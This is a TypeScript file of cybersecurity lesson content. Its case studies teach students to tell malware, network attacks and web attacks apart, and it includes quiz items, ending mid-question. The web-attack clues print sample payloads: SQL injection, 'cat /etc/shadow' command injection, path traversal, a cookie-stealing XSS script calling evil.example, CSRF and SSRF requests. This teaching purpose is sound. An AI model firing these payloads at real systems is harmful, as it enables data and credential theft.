import { CaseFile, LessonBody } from '../../networking.model';
import { analogy, cases, decide, exam, h, mcq, p, recap, step, table, tip, trap, words } from '../dsl';

export const MALWARE_OPTIONS = ['Virus', 'Worm', 'Trojan', 'Remote access trojan (RAT)', 'Ransomware', 'Spyware', 'Keylogger', 'Rootkit', 'Logic bomb', 'Bloatware', 'Fileless malware'];

/** One case for each kind of malware in objective 2.4, each with the look-alike it is most often confused with. */
export const MALWARE_CASES: CaseFile[] = [
  {
    name: 'The shared spreadsheets',
    clues: [
      { from: 'Help desk ticket', text: 'Three people in Accounts say their budget spreadsheets now show a strange pop-up when opened.' },
      { from: 'File scan', text: 'The same malicious macro has been **added inside 40 existing spreadsheets** on the shared drive.', key: true },
      { from: 'EDR timeline', text: 'Each new infection happened at the moment **someone opened an infected file**. Machines where nobody opened one are clean.', key: true },
      { from: 'Network monitor', text: 'No scanning and no unusual outbound connections.' },
    ],
    answer: 'Virus',
    why: 'A virus attaches itself to a host, here existing spreadsheet files, and runs only when a person opens or runs that host. That is how it spreads: from file to file as people share them.',
    near: { option: 'Worm', why: 'A worm needs no host file and no person: it copies itself across the network on its own. This one spread only when someone opened an infected file.' },
  },
  {
    name: 'The overnight outbreak',
    clues: [
      { from: 'EDR console', text: '310 computers infected between **02:05 and 02:40**, in four buildings.' },
      { from: 'Firewall log', text: 'Every infected host is **scanning port 445 (SMB)** on random internal addresses and sending a copy of itself to any that answer.', key: true },
      { from: 'Email gateway', text: 'No suspicious messages or attachments in the last week.' },
      { from: 'Night shift', text: 'Nobody was signed in on most of the infected machines at the time.', key: true },
    ],
    answer: 'Worm',
    why: 'A worm is self-propagating: it exploits a network service such as SMB to copy itself from host to host, with no user action and no host file. Hundreds of machines in minutes, overnight, is the classic sign.',
    near: { option: 'Virus', why: 'A virus needs a person to open or run an infected file. Here nobody was even signed in, and the spread came from scanning the network.' },
  },
  {
    name: 'The free PDF converter',
    clues: [
      { from: 'Help desk ticket', text: 'A user downloaded **"PDF Converter Pro (free)"** from a download site. It converts PDFs perfectly.', key: true },
      { from: 'EDR alert', text: 'The installer also placed `updatesvc.exe` in a startup folder, unsigned.' },
      { from: 'Proxy log', text: '`updatesvc.exe` downloads further files from a server registered last week, then exits.' },
      { from: 'Other machines', text: 'No other computers are affected. It did not spread.' },
    ],
    answer: 'Trojan',
    why: 'A trojan pretends to be something useful so that the victim installs it willingly, then delivers a hidden payload. It does the advertised job, which is exactly what makes the disguise work. Trojans do not spread by themselves.',
    near: { option: 'Virus', why: 'A virus infects other files to spread. Nothing here was infected or spread; the user installed one program because it looked useful, which is the trojan\'s trick.' },
  },
  {
    name: 'The game booster',
    clues: [
      { from: 'User', text: 'Installed a free "game booster" from a gaming forum last week.' },
      { from: 'Firewall log', text: 'The laptop keeps a connection open to `203.0.113.50:4444` and checks in every 60 seconds.' },
      { from: 'EDR timeline', text: 'While the user was at lunch, someone **browsed folders, took screenshots, turned on the webcam and ran commands** on the laptop.', key: true },
    ],
    answer: 'Remote access trojan (RAT)',
    why: 'A RAT is a trojan whose payload is a backdoor with full remote control. The attacker works on the machine live, issuing commands through the open connection, as if sitting at the keyboard.',
    near: { option: 'Spyware', why: 'Spyware quietly collects and sends information. Here a person is actively controlling the machine and running commands, which is remote access, not just watching.' },
  },
  {
    name: 'The locked file server',
    clues: [
      { from: 'Help desk', text: 'Nobody can open any file on the S: drive. Every file now ends in `.lck9`.', key: true },
      { from: 'File share', text: 'A file called `HOW_TO_RECOVER.txt` in every folder demands payment in cryptocurrency within 72 hours.', key: true },
      { from: 'Leak site', text: 'The attackers have posted a sample of the company\'s contracts to prove they also copied them.' },
    ],
    answer: 'Ransomware',
    why: 'Ransomware encrypts data, or locks the system, and demands payment for the key. Copying the data out first and threatening to publish it is double extortion, so it breaks confidentiality as well as availability.',
    near: { option: 'Spyware', why: 'The data theft is real, but spyware works quietly to collect information. Encrypting files and demanding payment is what defines ransomware.' },
  },
  {
    name: 'The quiet shared laptop',
    clues: [
      { from: 'Forensics', text: 'A hidden program on the training-room laptop **records every website visited and takes a screenshot every five minutes**.', key: true },
      { from: 'Mail log', text: 'Once a day it emails a zip of the screenshots and browsing history to an outside mailbox.' },
      { from: 'EDR timeline', text: 'No commands have ever been run remotely, and nothing else on the network is affected.' },
    ],
    answer: 'Spyware',
    why: 'Spyware secretly monitors what a user does, such as sites visited, screenshots, location or contacts, and sends it to someone else. It watches and reports rather than destroying or controlling.',
    near: { option: 'Keylogger', why: 'A keylogger is a kind of spyware that records keystrokes. This one collects browsing history and screenshots, so the broader answer, spyware, fits better.' },
  },
  {
    name: 'The reception desk',
    clues: [
      { from: 'SIEM', text: 'Four staff accounts signed in from abroad this week. Each person used the reception PC the day before.' },
      { from: 'Software scan', text: 'Antivirus and EDR find nothing on the reception PC.' },
      { from: 'Physical check', text: 'A small **USB adapter sits between the keyboard cable and the PC**. Inside is flash memory full of typed text.', key: true },
    ],
    answer: 'Keylogger',
    why: 'A keylogger records keystrokes to capture passwords and other typed secrets. Hardware keyloggers sit between the keyboard and the computer, so software scans cannot see them; a physical inspection finds them.',
    near: { option: 'Spyware', why: 'Keyloggers are a kind of spyware, but when the clue is captured keystrokes, especially from a device on the keyboard cable, the exam wants the specific answer: keylogger.' },
  },
  {
    name: 'The invisible process',
    clues: [
      { from: 'Network monitor', text: 'The database server sends data to an unknown address every night.' },
      { from: 'Admin', text: 'Task Manager and the antivirus scan show **nothing unusual: no process matches the traffic**.', key: true },
      { from: 'Offline scan', text: 'Booting from clean media and scanning the disk finds a **modified kernel driver** that hides one process and one folder from the operating system.', key: true },
    ],
    answer: 'Rootkit',
    why: 'A rootkit gains administrator or kernel-level control and hides itself from the operating system and the tools that rely on it. Tools running on the infected system are lied to, which is why an offline scan or a rebuild is needed.',
    near: { option: 'Fileless malware', why: 'Fileless malware avoids writing files, but it does not hide from the operating system: its processes, such as PowerShell, are visible. Here the OS itself was changed to hide something.' },
  },
  {
    name: 'The payroll script',
    clues: [
      { from: 'HR', text: 'A database administrator was dismissed on 3 March.' },
      { from: 'Code review', text: 'A nightly payroll script contains: **if the employee ID 4471 is no longer on the payroll, delete the accounts database**.', key: true },
      { from: 'Incident timeline', text: 'On 1 April, the first payroll run after his record was removed, the accounts database was deleted.' },
    ],
    answer: 'Logic bomb',
    why: 'A logic bomb is code planted to sit dormant until a condition is met, such as a date, an event or a person leaving, and then do damage. Insiders with access to scripts and code are the usual authors.',
    near: { option: 'Trojan', why: 'A trojan tricks a victim into installing it. Nothing was disguised or installed here: an insider hid code in a real script and it waited for its trigger.' },
  },
  {
    name: 'The new laptops',
    clues: [
      { from: 'Asset team', text: '200 new laptops arrived with a trial antivirus, three game launchers and the maker\'s "helper" service **already installed**.', key: true },
      { from: 'Vulnerability scan', text: 'The helper service listens on a local port and has a published remote code execution flaw.' },
      { from: 'Users', text: 'Start-up is slow and pop-ups keep offering upgrades.' },
    ],
    answer: 'Bloatware',
    why: 'Bloatware is unwanted software that comes preinstalled, or bundled with something else. It wastes resources and widens the attack surface with code nobody needs or patches. The fix is to remove it in the standard image.',
    near: { option: 'Trojan', why: 'Nobody was tricked into installing anything: the manufacturer put it there. It is not hiding a payload, it is just unneeded software that adds risk.' },
  },
  {
    name: 'The PowerShell window',
    clues: [
      { from: 'EDR alert', text: 'Word started `powershell.exe -enc JABzAD0ATgBlAHcA...` (an encoded command).', mono: true },
      { from: 'Disk scan', text: '**No new files** were written to disk. The signature-based antivirus finds nothing.', key: true },
      { from: 'Memory analysis', text: 'The payload runs **only in memory**, and a WMI subscription restarts it at each sign-in.', key: true },
    ],
    answer: 'Fileless malware',
    why: 'Fileless malware runs in memory and uses tools already on the system, such as PowerShell and WMI, so there is no file for signature scanning to find. This is "living off the land". Behaviour-based EDR is what catches it.',
    near: { option: 'Rootkit', why: 'A rootkit changes the operating system to hide itself. Here PowerShell is plainly visible; the malware avoids detection by leaving no file, not by hiding the process.' },
  },
];

export const NETWORK_OPTIONS = ['DDoS (botnet flood)', 'Amplified DDoS', 'Evil twin', 'Rogue access point', 'Deauthentication attack', 'Wireless jamming', 'On-path (ARP poisoning)', 'DNS poisoning', 'Credential replay (pass-the-hash)'];

export const NETWORK_CASES: CaseFile[] = [
  {
    name: 'The search page that would not load',
    clues: [
      { from: 'Web server', text: 'Requests for `/search?q=...` rose from 200 to 90,000 a second. The site stopped responding.' },
      { from: 'Firewall', text: 'The requests come **directly from about 40,000 home internet addresses** around the world, each sending only a few.', key: true },
      { from: 'Threat intel', text: 'Many of the addresses are known infected cameras and home routers.' },
    ],
    answer: 'DDoS (botnet flood)',
    why: 'A distributed denial of service uses many machines, here a botnet of infected devices, to exhaust a target. Each bot sends its own traffic straight at the victim, so blocking one address does nothing.',
    near: { option: 'Amplified DDoS', why: 'In an amplified attack the flood arrives as replies from third-party servers. Here the traffic comes straight from the bots, as requests, not as reflected answers.' },
  },
  {
    name: 'The answers nobody asked for',
    clues: [
      { from: 'Firewall', text: '60 Gbps of **DNS responses** (UDP source port 53) from 5,000 different DNS servers.', key: true },
      { from: 'DNS team', text: 'Our servers **never sent the queries** these responses answer.', key: true },
      { from: 'Packet capture', text: 'Each response is about 3,000 bytes. The matching queries, spoofed with our address, were about 60 bytes.' },
    ],
    answer: 'Amplified DDoS',
    why: 'The attacker sent small queries with the victim\'s address forged as the source (reflection), choosing requests whose replies are about 50 times larger (amplification). Open resolvers did the flooding for them.',
    near: { option: 'DDoS (botnet flood)', why: 'A botnet flood comes straight from the bots. Responses to queries the victim never sent, from innocent servers, are the mark of a reflected, amplified attack.' },
  },
  {
    name: 'Two cafés, one name',
    clues: [
      { from: 'Staff report', text: 'At the café, the laptop showed **two networks called "Harbor Cafe Guest"**. It joined the stronger one.', key: true },
      { from: 'Same staff member', text: 'A sign-in page then asked for company email credentials "to use the Wi-Fi".' },
      { from: 'Café owner', text: 'The café has one access point and no sign-in page.' },
    ],
    answer: 'Evil twin',
    why: 'An evil twin copies the name of a real network, often with a stronger signal, so people connect to it. The attacker then sits in the middle of their traffic or collects credentials on a fake portal.',
    near: { option: 'Rogue access point', why: 'A rogue AP is any unauthorized access point on your network. An evil twin specifically impersonates a real network\'s name to lure users, which is what happened here.' },
  },
  {
    name: 'The meeting room jack',
    clues: [
      { from: 'Wireless survey', text: 'An unknown network called "FastNet-5G" is broadcasting from the third floor.' },
      { from: 'Switch port', text: 'It comes from a small consumer access point **plugged into a network jack**, connected straight to the internal LAN.', key: true },
      { from: 'Employee', text: '"I brought it from home because the Wi-Fi in that room is slow."' },
    ],
    answer: 'Rogue access point',
    why: 'A rogue access point is one connected to the network without authorization, here by an employee, with no malice needed. It bypasses the wireless security and opens the internal LAN to anyone nearby.',
    near: { option: 'Evil twin', why: 'An evil twin copies a real network\'s name to trick users. This one has its own name and was plugged into the LAN, which is what makes it rogue.' },
  },
  {
    name: 'Everyone keeps dropping off',
    clues: [
      { from: 'Users', text: 'Laptops on the office Wi-Fi disconnect and reconnect every few seconds.' },
      { from: 'Wireless IDS', text: 'A flood of **deauthentication frames that claim to come from the company\'s own access points**.', key: true },
      { from: 'Spectrum analyser', text: 'The radio channel is otherwise normal, with no unusual noise.' },
    ],
    answer: 'Deauthentication attack',
    why: 'The attacker forges the management frames that tell clients to disconnect. It is used to knock people off, capture the handshake when they reconnect, or push them to an evil twin. Protected management frames (802.11w, required in WPA3) stop it.',
    near: { option: 'Wireless jamming', why: 'Jamming is radio noise that drowns out every signal. Here the channel is clean, and the disconnections come from forged frames the network itself understands.' },
  },
  {
    name: 'The warehouse scanners',
    clues: [
      { from: 'Warehouse', text: 'Every handheld scanner lost Wi-Fi at once. None can reconnect.' },
      { from: 'Spectrum analyser', text: '**Constant strong noise across the whole 2.4 GHz band**, with no readable Wi-Fi frames at all.', key: true },
      { from: 'Wired network', text: 'Everything plugged in by cable works normally.' },
    ],
    answer: 'Wireless jamming',
    why: 'Jamming floods the radio band with noise so no device can send or receive. It is a denial of service at the physical layer: there is nothing to log, just a band full of noise.',
    near: { option: 'Deauthentication attack', why: 'A deauth attack sends forged but valid Wi-Fi frames. Here there are no readable frames at all, only noise, which is jamming.' },
  },
  {
    name: 'The gateway that moved',
    clues: [
      { from: 'Switch', text: 'The default gateway, `10.0.0.1`, **now maps to the MAC address of a desk PC**, not the router.', key: true },
      { from: 'Users on that subnet', text: 'Certificate warnings on some sites, and everything is a little slower.' },
      { from: 'DNS', text: 'Names still resolve to the right addresses.' },
    ],
    answer: 'On-path (ARP poisoning)',
    why: 'By sending forged ARP replies, the PC told everyone on the subnet that it is the gateway. All their traffic now passes through it, so it can read or change it: an on-path attack on the local network.',
    near: { option: 'DNS poisoning', why: 'DNS poisoning changes which IP address a name resolves to. Here the names are fine; the MAC address behind the gateway\'s IP changed, which is ARP.' },
  },
  {
    name: 'The intranet copy',
    clues: [
      { from: 'Users', text: 'Typing `intranet.corp.example` shows a sign-in page that looks right, but passwords "never work".' },
      { from: 'Resolver cache', text: '`intranet.corp.example` → `198.51.100.66`. The real server is `10.1.1.20`.', key: true },
      { from: 'Switch', text: 'ARP tables are normal.' },
    ],
    answer: 'DNS poisoning',
    why: 'Forged records in the resolver\'s cache send everyone who asks for the name to the attacker\'s server. The users typed the right name; the answer they got was wrong. DNSSEC lets resolvers detect forged answers.',
    near: { option: 'On-path (ARP poisoning)', why: 'ARP poisoning redirects traffic on the local network by changing MAC mappings. Here the ARP tables are fine and the name itself resolves to the wrong address.' },
  },
  {
    name: 'The admin who never typed a password',
    clues: [
      { from: 'SIEM', text: 'The domain admin account signed in to **30 servers in 6 minutes, using NTLM**, all from the reception PC.' },
      { from: 'Authentication logs', text: '**No failed attempts**, and the admin was on holiday.' },
      { from: 'Reception PC', text: 'A memory-dumping tool was run on it, and its output contains **password hashes** taken from memory.', key: true },
    ],
    answer: 'Credential replay (pass-the-hash)',
    why: 'NTLM accepts the password hash itself as proof, so an attacker who steals a hash from memory can replay it to sign in without ever knowing the password. That is how they moved from server to server.',
    near: { option: 'DDoS (botnet flood)', why: 'Nothing was flooded or slowed down. The attacker signed in as a real account with stolen credentials, and there were no failed attempts.' },
  },
];

export const APP_OPTIONS = ['SQL injection', 'Command injection', 'Directory traversal', 'Buffer overflow', 'Cross-site scripting (XSS)', 'Cross-site request forgery (CSRF)', 'Server-side request forgery (SSRF)', 'Replay attack', 'Privilege escalation'];

export const APP_CASES: CaseFile[] = [
  {
    name: 'The product page',
    clues: [
      { from: 'Web log', text: `GET /products?id=42' OR '1'='1' -- HTTP/1.1  200  2.1 MB`, mono: true, key: true },
      { from: 'Normal traffic', text: 'A product page is usually about 4 KB.' },
    ],
    answer: 'SQL injection',
    why: 'The quote ends the value and `OR \'1\'=\'1\'` makes the database query true for every row, so the page returned the whole table. Parameterized queries, which never mix input into the SQL, are the fix.',
    near: { option: 'Command injection', why: 'Command injection sends operating system commands. Quotes, OR and the SQL comment `--` are aimed at a database query.' },
  },
  {
    name: 'The network test tool',
    clues: [
      { from: 'Web log', text: 'POST /tools/ping   host=8.8.8.8; cat /etc/shadow', mono: true, key: true },
      { from: 'Response', text: 'The ping results, followed by the server\'s password hash file.' },
    ],
    answer: 'Command injection',
    why: 'The page passes the host field to a shell command. The semicolon ends the ping and starts a second command of the attacker\'s choosing, run with the web server\'s rights. Validate input against an allow list and avoid calling a shell.',
    near: { option: 'Directory traversal', why: 'Traversal uses `../` in a path to reach files. Here the attacker runs a new command, `cat`, after a semicolon, which is injection.' },
  },
  {
    name: 'The download link',
    clues: [
      { from: 'Web log', text: 'GET /download?file=../../../../etc/passwd   200', mono: true, key: true },
      { from: 'Web log', text: 'GET /download?file=%2e%2e%2f%2e%2e%2fwindows%2fwin.ini   200', mono: true },
    ],
    answer: 'Directory traversal',
    why: 'Each `../` climbs one folder up and out of the download folder, to files the site should never serve. The second line is the same trick URL-encoded (`%2e%2e%2f` is `../`) to slip past simple filters.',
    near: { option: 'Command injection', why: 'No command is run: the attacker reads a file by walking up the folder tree. That path trick is traversal.' },
  },
  {
    name: 'The very long user name',
    clues: [
      { from: 'Web log', text: 'POST /login   username=AAAAAAAAAAAAAAAA...(5,000 more A)...\\x90\\x90\\x90\\x31\\xc0...', mono: true, key: true },
      { from: 'Service log', text: 'The login service crashed, restarted, then opened a connection to an outside address.' },
    ],
    answer: 'Buffer overflow',
    why: 'The input is far longer than the memory set aside for it, so it overwrites what sits next to it and can redirect the program to the attacker\'s code (the bytes after the A\'s). Bounds checking and memory protections such as ASLR and DEP defend against it.',
    near: { option: 'SQL injection', why: 'There is no query syntax here, only an enormous value followed by raw machine code bytes. The crash and the new connection show memory was overwritten.' },
  },
  {
    name: 'The comment box',
    clues: [
      { from: 'Forum post', text: `Great article! <script>fetch('https://evil.example/c?'+document.cookie)</script>`, mono: true, key: true },
      { from: 'Users', text: 'Everyone who opened the article had their session taken over within the hour.' },
    ],
    answer: 'Cross-site scripting (XSS)',
    why: 'The site stores the comment and shows it to others without encoding it, so the attacker\'s script runs in every reader\'s browser, here sending their session cookies away. Encode output and filter input.',
    near: { option: 'Cross-site request forgery (CSRF)', why: 'CSRF makes the victim\'s browser send a request, but runs no script on the trusted site. Here attacker script runs on the site itself, which is XSS.' },
  },
  {
    name: 'The money transfer nobody made',
    clues: [
      { from: 'Customer', text: 'Was signed in to the bank in one tab while reading a hobby forum in another.' },
      { from: 'Forum page source', text: `<img src="https://bank.example/transfer?to=99311&amount=500">`, mono: true, key: true },
      { from: 'Bank log', text: 'Transfer accepted: the customer\'s valid session cookie, sent from a page on the forum.' },
    ],
    answer: 'Cross-site request forgery (CSRF)',
    why: 'The forum page made the customer\'s browser send a request to the bank, and the browser attached the bank\'s session cookie automatically. The bank cannot tell it was not the customer. Anti-CSRF tokens and SameSite cookies stop it.',
    near: { option: 'Cross-site scripting (XSS)', why: 'No script ran on the bank\'s site. Another site simply made the browser send a forged request that the bank trusted.' },
  },
  {
    name: 'The link preview',
    clues: [
      { from: 'Web log', text: 'POST /api/preview   url=http://169.254.169.254/latest/meta-data/iam/security-credentials/', mono: true, key: true },
      { from: 'Response', text: 'The preview shows the cloud server\'s temporary access keys.' },
    ],
    answer: 'Server-side request forgery (SSRF)',
    why: 'The preview feature fetches any URL it is given, from the server itself. The attacker pointed it at an internal-only address, the cloud metadata service, which the server can reach but they cannot. Allow-list the destinations.',
    near: { option: 'Cross-site request forgery (CSRF)', why: 'CSRF tricks a user\'s browser into sending a request. In SSRF it is the server that is tricked into sending the request, here to an internal address.' },
  },
  {
    name: 'The same request, twice',
    clues: [
      { from: 'API log, 09:14', text: 'POST /api/payments   token=7f3a9c...   nonce=none   amount=250   from 192.0.2.10', mono: true },
      { from: 'API log, 12:47', text: '**Exactly the same request**, same token and amount, from 198.51.100.23. Accepted again.', key: true },
      { from: 'Network', text: 'The partner\'s API traffic was sent over plain HTTP.' },
    ],
    answer: 'Replay attack',
    why: 'The attacker captured a valid request and simply sent it again later. Nothing was cracked or changed. Timestamps, one-time nonces, short-lived tokens and TLS stop a captured request being reused.',
    near: { option: 'Privilege escalation', why: 'No extra rights were gained: the attacker resent a request the real user was already allowed to make.' },
  },
  {
    name: 'The viewer who became an admin',
    clues: [
      { from: 'User', text: 'Jo has the "viewer" role in the project tool.' },
      { from: 'API log', text: 'PATCH /api/users/jo   {"role": "admin"}   200 OK', mono: true, key: true },
      { from: 'Audit log', text: 'Minutes later Jo deleted three projects and exported every user\'s details.' },
    ],
    answer: 'Privilege escalation',
    why: 'Jo gained rights the account was never given, by asking the API to change its own role, and the API did not check. Gaining higher rights is vertical escalation; reaching another user\'s data at the same level is horizontal.',
    near: { option: 'Replay attack', why: 'A replay resends a request someone was allowed to make. This request asked for more rights than Jo had, and the server wrongly granted them.' },
  },
];

export const MALWARE: LessonBody = {
  goals: [
    'Tell each kind of malware apart by how it gets in, how it spreads and what it does',
    'Name the malware from clues in tickets, logs and tools, and say why its look-alike does not fit',
    'Recognise the indicators of malicious activity in objective 2.4',
    'Respond to an outbreak in a way that fits the malware: contain a worm, close its way in, rebuild after a rootkit',
  ],
  blocks: [
    recap('Topic 1 sorted attacks by the goal they break, and Topic 13 covered phishing, the most common way malware arrives. This topic names the malware itself. For each kind, learn the one clue that tells it apart from its look-alike: that is what exam questions test.'),
    words(
      ['Malware', 'Any software written to do harm: steal, spy, destroy, extort or take control'],
      ['Payload', 'The part of malware that does the damage, as opposed to the part that spreads it'],
      ['Persistence', 'How malware survives a restart, for example a startup entry or a scheduled task'],
      ['Command and control (C2)', 'The server an attacker uses to send orders to infected machines and receive stolen data'],
      ['Backdoor', 'A hidden way into a system that skips the normal sign-in'],
      ['Signature', 'A known pattern, such as a file hash, that antivirus matches to recognise malware'],
      ['Indicator of compromise (IoC)', 'Evidence that an attack has happened, such as a known bad address or file hash'],
    ),

    h('Malware: how it gets in, spreads and hurts', { objective: '2.4', keep: 'Ask three questions. How did it get in (a disguise: trojan)? How does it spread (needs a host and a user: virus; by itself: worm)? What does it do (encrypts: ransomware; watches: spyware, keylogger; hides: rootkit; waits: logic bomb)?' }),
    p('The names sound alike, but each kind of malware is defined by **one** thing: how it arrives, how it spreads, or what it does. One program can be several at once, such as a trojan that installs ransomware. The exam describes behaviour and asks for the name, so learn the defining behaviour.'),
    table(
      ['Type', 'Defined by', 'What it does', 'The giveaway'],
      [
        ['Virus', 'Spreads by attaching to a **host** file or program; needs a **user** to run it', 'Whatever its payload is, from annoying to destructive', 'Infected files; spreads as people open and share them'],
        ['Worm', 'Spreads **by itself** across the network, exploiting a service; no host, no user', 'Uses bandwidth and carries payloads such as ransomware', 'Many machines infected fast; scanning traffic'],
        ['Trojan', 'A **disguise**: looks useful, so the victim installs it', 'Delivers a hidden payload; does not spread itself', 'A "free" tool, crack or fake update'],
        ['Remote access trojan (RAT)', 'A trojan whose payload is a **backdoor** with remote control', 'Lets an attacker run commands, use the webcam, move files', 'Steady connection to a C2 server; live actions'],
        ['Ransomware', 'Encrypts data or locks the system and **demands payment**', 'Breaks availability; with data theft, confidentiality too', 'Renamed files and a ransom note'],
        ['Spyware', 'Secretly **monitors** and reports', 'Collects browsing, screenshots, location, contacts', 'Data quietly sent out; no damage done'],
        ['Keylogger', 'Records **keystrokes** (software or a hardware device)', 'Captures passwords and card numbers as they are typed', 'Accounts misused after typing on one machine'],
        ['Rootkit', 'Gains **admin or kernel** level and **hides** itself', 'Conceals processes, files and other malware', 'Traffic or activity no tool on the system can see'],
        ['Logic bomb', 'Dormant code that waits for a **trigger**: a date, an event, a person leaving', 'Deletes or damages when triggered', 'Planted by an insider in a script or program'],
        ['Bloatware', 'Unwanted software that comes **preinstalled** or bundled', 'Wastes resources and widens the attack surface', 'Trial apps and vendor tools on new devices'],
        ['Fileless malware', 'Runs **in memory** using built-in tools such as PowerShell and WMI', 'Avoids signature scanning; "living off the land"', 'Odd PowerShell activity; nothing new on disk'],
      ],
      { caption: 'The malware types in objective 2.4' },
    ),
    analogy('A **virus** is a cold you catch by touching what someone else touched: it needs a host and a person. A **worm** walks from house to house by itself. A **trojan** is the wooden horse: you carried it in because it looked like a gift. A **logic bomb** is a timer. A **rootkit** is a burglar who also bribed the security guard to say nothing is wrong.'),
    trap('**Virus or worm?** Ask whether a person had to do something. Opened an attachment, ran a program, shared a file: virus. Spread overnight across the network with nobody involved: worm. **Spyware or keylogger?** A keylogger is a kind of spyware; choose keylogger when the clue is keystrokes.'),

    h('Try it: name the malware', { objective: '2.4', keep: 'Find the clue only one answer explains: a host file and a user (virus), self-spread (worm), a useful disguise (trojan), live remote control (RAT), a trigger (logic bomb), hidden from the OS (rootkit), nothing on disk (fileless), preinstalled (bloatware).' }),
    cases('Name the malware', MALWARE_OPTIONS, MALWARE_CASES, { icon: 'pest_control', intro: 'Each case is a few clues from tickets, logs and tools. Pick what it is, then check. You will see **which clue gave it away** and the look-alike it is most often confused with.' }),
    exam('Look for the defining word. **Opened** or **ran** a file: virus. **Self-replicating** or **spread without user interaction**: worm. **Appeared legitimate**: trojan. **Specific date** or **after termination**: logic bomb. **Hides its presence** or **kernel**: rootkit. **PowerShell** and **memory only**: fileless.'),

    h('Indicators of malicious activity', { objective: '2.4', keep: 'Indicators: account lockouts, concurrent sessions, blocked content, impossible travel, unusual resource use or inaccessibility, logging out of cycle, missing logs, and published IoCs. None proves an attack alone; each is a reason to look.' }),
    p('The attacks above leave traces. Objective 2.4 lists the signs to watch for. Any one of them can be innocent, but each is a reason to look closer, and several together tell a story.'),
    table(
      ['Indicator', 'What it looks like', 'What it might mean'],
      [
        ['Account lockout', 'Accounts locked after many failed sign-ins', 'Brute force or spraying, or an attacker locking users out'],
        ['Concurrent session usage', 'One account signed in from two places at once', 'Stolen credentials or a hijacked session'],
        ['Blocked content', 'The proxy, firewall or email gateway blocking attempts to reach bad sites or files', 'Malware calling home, or a user being phished'],
        ['Impossible travel', 'Sign-ins from two countries hours apart', 'A stolen password used from elsewhere'],
        ['Resource consumption', 'CPU, memory, disk or bandwidth unusually high', 'Cryptomining, a worm, data being copied out, a DoS'],
        ['Resource inaccessibility', 'Files, services or systems suddenly unavailable', 'Ransomware or a denial of service'],
        ['Out-of-cycle logging', 'Log entries at times when nothing should run, such as 3 a.m. admin changes', 'An intruder working when nobody watches'],
        ['Missing logs', 'Gaps in logs, or logs cleared', 'An attacker covering their tracks'],
        ['Published or documented', 'Your data, or your IoCs, appearing in threat reports or on leak sites', 'A breach found by someone else first'],
      ],
      { caption: 'The indicators in objective 2.4' },
    ),
    tip('Topic 10 has you hunt for these in a night of SIEM events, from the first sprayed password to the cleared log.'),

    h('Respond: a worm with a ransomware payload', { objective: '2.4', keep: 'Identify the type from its behaviour, because the type decides the response: isolate a worm\'s network path, close the hole it used, and rebuild anything a rootkit touched rather than trusting a scan.' }),
    decide('Monday morning at a logistics firm', [
      step(
        { phase: 'Identify', situation: '07:40. EDR on three warehouse PCs reports files renamed to `.lck9` and a ransom note. By 07:50, twelve more PCs in two other buildings show the same, and on most of them nobody was signed in.', question: 'What are you dealing with?' },
        { text: 'Ransomware spreading like a worm, copying itself across the network on its own', feedback: 'The payload is ransomware (encrypted files and a note), but the spread, across buildings in minutes with nobody signed in, is worm behaviour. Naming both shapes the response.' },
        { text: 'A virus spread by staff opening an infected attachment', feedback: 'A virus needs someone to open or run a file. Machines with nobody signed in were infected, so something is spreading without users.' },
        { text: 'A logic bomb planted by an insider and set for Monday', feedback: 'A logic bomb would fire where it was planted. Infection moving from machine to machine over ten minutes is spread, not a timer.' },
        { text: 'A DDoS attack against the warehouse network', feedback: 'A DDoS floods a service so it cannot answer. Here files are encrypted and a note left, which is ransomware, not a flood of traffic.' },
      ),
      step(
        { phase: 'Contain', situation: 'The infection is still spreading. EDR shows each infected PC connecting to others over SMB, port 445.', question: 'What do you do first?' },
        { text: 'Isolate the affected network segments and block SMB between them, leaving the infected PCs powered on', feedback: 'Cutting the worm\'s network path stops the spread at once. Leaving the PCs on keeps what is in memory, which may include encryption keys and evidence of how it got in.' },
        { text: 'Run a full antivirus scan on every computer', feedback: 'A full scan of every machine takes hours while the worm keeps spreading. Contain first, then clean.' },
        { text: 'Email all staff warning them not to open attachments', feedback: 'This worm needs no user action, so a warning about attachments does not slow it. The spread has to be stopped on the network.' },
        { text: 'Pay the ransom quickly before more machines are encrypted', feedback: 'Paying does not stop a worm spreading, gives no guarantee of a working key, and funds the next attack. Stop the spread first.' },
      ),
      step(
        { phase: 'Close the way in', situation: 'The first infected machine was an internet-facing file transfer server, missing a patch for a known SMB flaw. The worm went from there to the internal network.', question: 'What must happen before the network is reconnected?' },
        { text: 'Patch the SMB flaw on every host, block SMB at the internet edge, and restore clean machines from backups', feedback: 'A worm exploits a flaw, so every unpatched host is a way back in. Closing the flaw and the exposed port means reconnecting does not start the outbreak again.' },
        { text: 'Reconnect once the infected machines are cleaned, since the worm is now gone', feedback: 'Any unpatched machine can be infected again by a single surviving copy. The flaw the worm used must be closed everywhere first.' },
        { text: 'Change every user\'s password', feedback: 'Password resets are sensible if credentials were stolen, but this worm spread through a software flaw, not by signing in.' },
        { text: 'Replace the antivirus product with a different vendor\'s', feedback: 'The worm got in through an unpatched service. Changing antivirus vendors leaves that hole open.' },
      ),
      step(
        { phase: 'Look deeper', situation: 'A week later, one rebuilt-from-backup server keeps sending data out at night. Antivirus and Task Manager on it show nothing, but a scan from clean boot media finds a modified kernel driver.', question: 'What explains it, and what do you do?' },
        { text: 'A rootkit is hiding the malware: rebuild the server from known-good media, not from that backup', feedback: 'A rootkit hides from the tools running on the system, which is why the scans looked clean. The backup was taken after the rootkit arrived, so the server must be rebuilt from a trusted image.' },
        { text: 'Run the antivirus scan again in its deepest mode', feedback: 'The scan runs on the compromised operating system, which the rootkit is lying to. Only an offline scan or a rebuild can be trusted.' },
        { text: 'It is spyware; uninstall it from the Programs list', feedback: 'It is hidden at kernel level and does not appear in any list. Removing what you can see leaves the rootkit in place.' },
        { text: 'Restore the same backup again to undo the change', feedback: 'That backup is where the rootkit came from. Restoring it brings the rootkit back.' },
      ),
    ], 'Identify the attack from its behaviour, then respond to what it is.'),
  ],
  check: [
    mcq('Malware spread to 200 computers overnight by exploiting a file-sharing service. No user opened anything. Which type is it?',
      'Worm', ['Virus', 'Trojan', 'Logic bomb'],
      'A worm spreads by itself across the network, exploiting a service, with no host file and no user action. A virus needs someone to run an infected file.'),
    mcq('A former developer\'s code deleted the customer database on the first payroll run after the developer\'s account was removed. What is this?',
      'A logic bomb', ['A rootkit', 'A remote access trojan', 'Ransomware'],
      'A logic bomb waits for a trigger condition, here the developer leaving, and then does damage. Insiders are the usual authors.'),
    mcq('Antivirus on a server finds nothing, yet an offline scan from boot media finds a modified kernel driver hiding a process. What is installed?',
